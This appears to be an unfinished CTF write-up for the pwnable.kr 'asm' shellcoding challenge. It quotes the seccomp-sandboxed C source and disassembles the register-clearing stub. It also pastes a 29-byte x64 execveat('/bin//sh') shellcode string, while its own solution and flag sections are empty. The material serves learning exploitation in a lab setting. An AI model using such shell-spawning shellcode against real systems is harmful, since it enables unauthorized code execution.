# Description
```

```
---
`~/readme`:
> once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege. make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)

Where the flag file name would be:
```
this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
```
Nice

`~/asm.c`:
```C
void sandbox(){  
    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);  
    if (ctx == NULL) {  
       printf("seccomp error\n");  
       exit(0);  
    }  
  
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);  
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);  
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);  
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);  
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);  
  
    if (seccomp_load(ctx) < 0){  
       seccomp_release(ctx);  
       printf("seccomp error\n");  
       exit(0);  
    }  
    seccomp_release(ctx);  
}  
  
char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"; // len = 45
unsigned char filter[256];  
int main(int argc, char* argv[]){  
  
    setvbuf(stdout, 0, _IONBF, 0);  
    setvbuf(stdin, 0, _IOLBF, 0);  
  
    printf("Welcome to shellcoding practice challenge.\n");  
    printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");  
    printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");  
    printf("If this does not challenge you. you should play 'asg' challenge :)\n");  
  
    char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);  
    memset(sh, 0x90, 0x1000);  
    memcpy(sh, stub, strlen(stub)); // copy shellcode to `sh`
      
    int offset = sizeof(stub);  
    printf("give me your x64 shellcode: ");  
    read(0, sh+offset, 1000);  
  
    alarm(10);  
    chroot("/home/asm_pwn");   // you are in chroot jail. so you can't use symlink in /tmp  
    sandbox();  
    ((void (*)(void))sh)();  // SHELLCODE EXECUTION
    return 0;  
}
```
### Findings
- X64 shellcode - executed in C
- chroot to `/home/asm_pwn` - I hope that means we could read the flag directly with `read({flag name})`
- memory
	- 1000 bytes of input
	- 4096 bytes allocated to `sh`
	- 4051 bytes after `stub` (shellcode will be directly after it)

### Questions
- ~~Memory location of `mmap` - 0x41414000~~ - I guess its not that important now
- What is that `sandbox` environment...?
	- I assume it allows only the listed syscalls


`stub` disassembles to:
```
4831C04831DB4831C94831D24831F64831FF4831ED4D31C04D31C94D31D24D31DB4D31E44D31ED4D31F64D31FF
```
-> 
```asm
0:  48 31 c0                xor    rax,rax  
3:  48 31 db                xor    rbx,rbx  
6:  48 31 c9                xor    rcx,rcx  
9:  48 31 d2                xor    rdx,rdx  
c:  48 31 f6                xor    rsi,rsi  
f:  48 31 ff                xor    rdi,rdi  
12: 48 31 ed                xor    rbp,rbp  
15: 4d 31 c0                xor    r8,r8  
18: 4d 31 c9                xor    r9,r9  
1b: 4d 31 d2                xor    r10,r10  
1e: 4d 31 db                xor    r11,r11  
21: 4d 31 e4                xor    r12,r12  
24: 4d 31 ed                xor    r13,r13  
27: 4d 31 f6                xor    r14,r14  
2a: 4d 31 ff                xor    r15,r15
```
Which is their way to not make us know whats held in most registers, except:
- `rsp` - Stack pointer
- `rip` - Instruction pointer


Based on the instructions, we would just need to write a shellcode to open the file, read to a buffer and finally write it to `stdout`.

I wrote this `C-PP` syntax:
```CPP

```


x86_64 execveat("/bin//sh") 29 bytes shellcode
```C
'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
```


# Flag 
```

```

